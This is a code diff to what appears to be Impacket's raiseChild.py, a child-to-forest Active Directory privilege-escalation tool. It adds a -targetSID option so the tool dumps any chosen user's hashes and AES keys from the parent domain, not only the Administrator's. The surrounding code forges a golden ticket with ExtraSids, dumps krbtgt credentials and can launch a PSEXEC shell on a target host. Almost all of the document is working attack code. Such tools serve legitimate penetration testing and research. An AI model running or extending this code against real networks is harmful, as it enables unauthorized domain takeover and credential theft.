@@ -19,7 +19,10 @@
 #           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
 #              The domain specified MUST be the domain FQDN.
 #           2) Optionally a pathname to save the generated golden ticket (-w switch)
-#           3) Optionally a target to PSEXEC with Enterprise Admin privieleges to (-target-exec switch)
+#           3) Optionally a target-user RID/SID to get credentials (-targetSID switch)
+#              Administrator by default.
+#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
+#              Enterprise Admin by default.
 #
 #       Process:
 #           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
@@ -28,14 +31,15 @@
 #           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
 #           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
 #              and setting expiration 10 years from now
-#           6) Use the generated ticket to log into the forest and get the krbtgt/admin info
+#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
 #           7) If file was specified, save the golden ticket in ccache format
 #           8) If target was specified, a PSEXEC shell is launched
 #
 #       Output:
-#           1) Forest's krbtgt/admin credentials
+#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
 #           2) A golden ticket saved in ccache for future fun and profit
-#           3) PSExec Shell with Enterprise Admin privileges at target-exec parameter.
+#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
+#              parameter.
 #
 #   IMPORTANT NOTE: Your machine MUST be able to resolve all the domains from the child domain up to the
 #                   forest. Easiest way to do is by adding the forest's DNS to your resolv.conf or similar
@@ -450,6 +454,7 @@ class RemoteStdInPipe(Pipes):
 class RAISECHILD:
     def __init__(self, target = None, username = '', password = '', domain='', options = None, command=''):
         self.__rid = 0
+        self.__targetSID = options.targetSID
         self.__target = target
         self.__kdcHost = None
         self.__command = command
@@ -563,7 +568,7 @@ class RAISECHILD:
             s.logoff()
         return s.getServerName() + '.' + s.getServerDNSDomainName()
 
-    def getParentSidAndAdminName(self, parentDC, creds):
+    def getParentSidAndTargetName(self, parentDC, creds, targetSID):
         if self.__doKerberos is True:
             # In Kerberos we need the target's name
             machineNameOrIp = self.getDNSMachineName(gethostbyname(parentDC))
@@ -594,11 +599,11 @@ class RAISECHILD:
 
         # Now that we have the Sid, let's get the Administrator's account name
         sids = list()
-        sids.append(domainSid+'-500')
+        sids.append(domainSid+'-'+targetSID)
         resp = hLsarLookupSids(dce, policyHandle, sids, LSAP_LOOKUP_LEVEL.LsapLookupWksta)
-        adminName = resp['TranslatedNames']['Names'][0]['Name']
+        targetName = resp['TranslatedNames']['Names'][0]['Name']
 
-        return domainSid, adminName
+        return domainSid, targetName
 
     def __connectDrds(self, domainName, creds):
         if self.__doKerberos is True or creds['TGT'] is not None:
@@ -1077,7 +1082,7 @@ class RAISECHILD:
         logging.info('Raising %s to %s' % (childName, parentName))
 
         # 3) Get the parents's Enterprise Admin SID (via [MS-LSAT])
-        entepriseSid, adminName = self.getParentSidAndAdminName(parentName, childCreds)
+        entepriseSid, targetName = self.getParentSidAndTargetName(parentName, childCreds, self.__targetSID)
         logging.info('%s Enterprise Admin SID is: %s-519' % (parentName,entepriseSid))
 
         # 4) Get the child domain's krbtgt credentials (via [MS-DRSR])
@@ -1154,6 +1159,7 @@ class RAISECHILD:
                     raise
 
         # 6) Use the generated ticket to log into the parent and get the krbtgt/admin info
+        # 6) Use the generated ticket to log into the parent and get the target-user info
         logging.info('Getting credentials for %s' % parentName)
         targetUser = 'krbtgt'
         childCreds['TGT'] = TGT
@@ -1162,21 +1168,22 @@ class RAISECHILD:
         parentName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
         print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetUser, credentials['aesKey'].decode("utf-8")))
 
-        logging.info('Administrator account name is %s' % adminName)
-        rid, credentials = self.getCredentials(adminName, parentName, childCreds)
-        print('%s/%s:%s:%s:%s:::' % (parentName, adminName, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
-        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, adminName, credentials['aesKey'].decode('utf-8')))
+        ################ Get TargetUser credentials (Administrator credentials by default)
+        logging.info('Target User account name is %s' % targetName)
+        rid, credentials = self.getCredentials(targetName, parentName, childCreds)
+        print('%s/%s:%s:%s:%s:::' % (parentName, targetName, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
+        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetName, credentials['aesKey'].decode('utf-8')))
 
-        adminCreds = {}
-        adminCreds['username'] = adminName
-        adminCreds['password'] = ''
-        adminCreds['domain'] = parentName
-        adminCreds['lmhash'] = credentials['lmhash']
-        adminCreds['nthash'] = credentials['nthash']
-        adminCreds['aesKey'] = credentials['aesKey']
-        adminCreds['TGT'] =  None
-        adminCreds['TGS'] =  None
-        return adminCreds, TGT, TGS
+        targetCreds = {}
+        targetCreds['username'] = targetName
+        targetCreds['password'] = ''
+        targetCreds['domain'] = parentName
+        targetCreds['lmhash'] = credentials['lmhash']
+        targetCreds['nthash'] = credentials['nthash']
+        targetCreds['aesKey'] = credentials['aesKey']
+        targetCreds['TGT'] =  None
+        targetCreds['TGS'] =  None
+        return targetCreds, TGT, TGS
 
     def exploit(self):
         # 1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
@@ -1188,7 +1195,7 @@ class RAISECHILD:
         logging.info('Forest FQDN is: %s' % forestName)
 
         # Let's raise up our child!
-        adminCreds, parentTGT, parentTGS = self.raiseUp(childName, childCreds, forestName)
+        targetCreds, parentTGT, parentTGS = self.raiseUp(childName, childCreds, forestName)
 
         # 7) If file was specified, save the golden ticket in ccache format
         if self.__writeTGT is not None:
@@ -1203,11 +1210,11 @@ class RAISECHILD:
             logging.info('Opening PSEXEC shell at %s' % self.__target)
             from impacket.smbconnection import SMBConnection
             s = SMBConnection('*SMBSERVER', self.__target)
-            s.kerberosLogin(adminCreds['username'], '', adminCreds['domain'], adminCreds['lmhash'],
-                            adminCreds['nthash'], useCache=False)
+            s.kerberosLogin(targetCreds['username'], '', targetCreds['domain'], targetCreds['lmhash'],
+                            targetCreds['nthash'], useCache=False)
 
             if self.__command != 'None':
-                executer = PSEXEC(self.__command, adminCreds['username'], adminCreds['domain'], s, None, None)
+                executer = PSEXEC(self.__command, targetCreds['username'], targetCreds['domain'], s, None, None)
                 executer.run(self.__target)
 
 if __name__ == '__main__':
@@ -1226,6 +1233,7 @@ if __name__ == '__main__':
     #parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller (needed to get the user''s SID). If omitted it will use the domain part (FQDN) specified in the target parameter')
     parser.add_argument('-target-exec', action='store',metavar = "target address",  help='Target host you want to PSEXEC '
                         'against once the main attack finished')
+    parser.add_argument('-targetSID', action='store', default='500', help='Target user RID/SID you want to dump credentials. Administrator (500) by default)')
 
     group = parser.add_argument_group('authentication')
 
